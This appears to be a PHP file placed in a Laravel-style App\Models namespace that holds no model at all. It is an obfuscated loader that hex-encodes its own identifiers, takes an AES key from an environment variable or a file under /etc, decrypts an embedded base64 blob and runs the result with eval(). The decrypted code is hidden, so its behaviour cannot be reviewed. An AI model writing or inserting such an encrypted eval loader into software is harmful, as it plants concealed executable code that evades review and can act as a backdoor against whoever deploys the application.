<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1zXdqrtf8pD47e9UwoBnrA==');

$c=base64_decode(

'4EeyKyaL6WcS075LssJJ0KgVVy/AXt4vhKPc6+SSMCxQaBLj6Kp2Zzg22VDyDMYp/KBcOYCv7qH7' .
'E2Il/60eeaXitjlcLXspUJeQvow+2PmaXumMGD7zz53mnMwKHIcMP76qjRX+7yYcnrQ+Zzg5DNHb' .
'dzu69r1Ee4hgp3N7Z6JOsCe6oSYM8D1QF9fypLD1donLBR7nWeUKLDqXrUHiZhEEbLdHnq9FJKwA' .
'yqRnITMkfcRSf4BC0BK90piLw0FXncTFL8gQ8zmdJSo4U8GT6iHLKbk0Q2sn63ZpEaV5otAlcxau' .
'wzHns2aE5EmEG0XFVbbMw8m9wzu2pC7j35Otkktm5q5IyV4BP/Sz28ywDWwHNxjH7YcDBIaCaL1V' .
'5n6+nyBtYEWw2IVO7Q+2gPcoBcyC3yVu9IBztKOa6PILK1HCdVw9oXmnlYxfEzjkGi/4uvWtE/EC' .
'PsRdT9LNLjIjwGSt+MJ8FOjB2XHW6bzr4Dln0uuOL/TwQF+QOrovpAGXosO3lDdHILf19922TKhe' .
'Gd1dOvCdA6mlemw5CSOLmdrtWbYCGgU8bdKVTK57MUMPSmgpgBgY2RmszSRdabgQFgGbe3lpyoUY' .
'kpjE5Gbwew+2rXiuWLjFg2ReWo2zttaTXBuMZ169vk1HvuAa1LbhgbMr5kaQ8TCfDerUCjrCr4AX' .
'7Acs225FrZazqiSfkt5ZJtd+EvylHueDWwyMDLbid5GnV8j3xNKCp4hKWRfTd/RUAi3e+vxnxGVO' .
'87GfgWNhfjW1srVyb86Z+zX3LHxLlomeRPwJp5Uf7+i8pg7c1DO2DxqC+QVFq5SRbzjSOjmIek0b' .
'twPHCPZ228QAGKj1+f7xgwG6sPs8Jkd24wWIvGCzbtwza0dy0SmTK8QvqxRr'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

